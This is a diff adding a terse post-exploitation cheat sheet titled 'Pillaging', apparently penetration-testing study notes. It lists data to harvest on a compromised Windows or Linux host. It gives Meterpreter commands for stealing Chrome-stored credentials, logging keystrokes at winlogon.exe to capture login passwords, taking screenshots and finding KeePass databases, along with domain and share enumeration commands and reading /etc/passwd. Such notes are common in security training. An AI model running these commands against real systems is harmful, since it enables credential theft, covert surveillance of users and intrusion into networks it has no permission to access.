@@ -1,0 +1,58 @@
+PILLAGING
+
+When enumerating you are looking for the following things:
+
+Important Files
+Credentials
+Accounts
+IM Logs
+Network blocks
+Domains
+Intranet Servers
+Shared Hard Drives
+Printers
+Repositories
+
+Scipts and Commands for Data Harvesting:
+
+Meterpreter:
+	sysinfo
+	getuid
+	ps
+	run post/windows/gather/ (there are 106 different possibilities we can run here)
+		some to look at:
+			enum shares
+			enum domain group users
+			enum services (this can be used instead of looking for services in windows)
+			enum domains
+			enum chrome (will try and get credentials stored in chrome)
+			enum applications
+	service --status-all
+	run winenum	
+	screenshot
+	screenshare 
+		(all that good stuff you already know)
+	keyscan_start (to explorer.exe or winlogon.exe)
+		winlogon.exe will show you what the user is typing as they login...
+	run keylogrecorder -c x (in place of the x either do 0 which is for explorer.exe, 1 which is for winlogon or 2
+			which is no migration the keystrokes will also be saved)
+	search -d C:\\Users\\els\\ -f *.kbdx (this will search for KeePass extensions)
+	
+	
+Shell:
+	wmic service get caption,startname,state,pathname
+	net start
+	net view /domain
+	net group "Domain Controllers" /domain
+	net user
+	net user /domain
+	net localgroup
+	localgroup Administrators
+	net share
+	arp -a
+	ipconfig
+	
+
+Linux Shell:
+	cat etc/passwd
+	
